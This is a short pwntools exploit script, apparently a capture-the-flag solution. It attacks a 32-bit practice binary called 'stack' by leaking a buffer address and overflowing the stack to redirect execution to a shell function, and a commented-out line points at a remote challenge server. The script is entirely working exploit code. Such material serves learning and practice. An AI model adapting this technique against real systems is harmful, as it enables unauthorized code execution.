#!/usr/bin/python
from pwn import *


context.log_level = "debug"

context.arch = "i386"
r = process("./stack")
# r = remote("124.16.75.117", 51008)


main_buf_len = 0x18
ebx_len = 0x4
local_res0_len = 0x4
ebp_len = 0x4

r.sendlineafter(b"input your name:", b"")
r.sendlineafter(b"choice:>>", b"1")
buf_addr = r.recvuntil(b"\nP")[14:-2]
# hex
buf_addr = buf_addr.decode("utf-8")
buf_addr = int(buf_addr, 16)
print(hex(buf_addr))
shelladdr = 0x8048644
exitaddr = 0x804889B
shelladdr_addr = buf_addr
r.sendlineafter(
    b"lease input your note:",
    p32(shelladdr)
    + p32(exitaddr)
    + b"a" * (main_buf_len - 8)
    + p32(shelladdr_addr + 4)  # ecx = esp + 4
    + b"x" * ebp_len,  # ebp
)
gdb.attach(r, "b *0x80488cb")
r.sendlineafter(b"choice:>>", b"3")
r.interactive()
